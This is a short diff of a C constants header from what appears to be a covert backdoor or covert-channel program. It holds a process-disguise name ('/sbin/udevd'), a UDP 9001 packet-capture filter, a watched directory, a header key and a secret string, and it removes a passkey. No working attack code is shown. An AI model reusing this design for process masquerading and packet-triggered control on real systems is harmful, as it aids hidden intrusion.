@@ -33,17 +33,18 @@ NOTES: This file holds the constants used throughout the program.
 
 #define MASK 	"/sbin/udevd"
 
-#define MAX_LEN    256
+#define ETHER_IP_UDP_LEN 44
+
+#define MAX_LEN    4096
 #define SLEEP_TIME 100000
 
 #define DEF_PRT 9001
 #define DEF_ADR "127.0.0.1"
 #define DEF_FLT "udp port 9001"
-#define DEF_WCH "/home/k/test/"
+#define DEF_WCH "/mnt/"
 
 #define SIGNTR  0x20
 #define HDR_KEY "(P^.^)=P"
-#define PASSKEY "tesserac"
 #define SEKRET  "Don't panic"
 
 #define FRAM_SZ 8
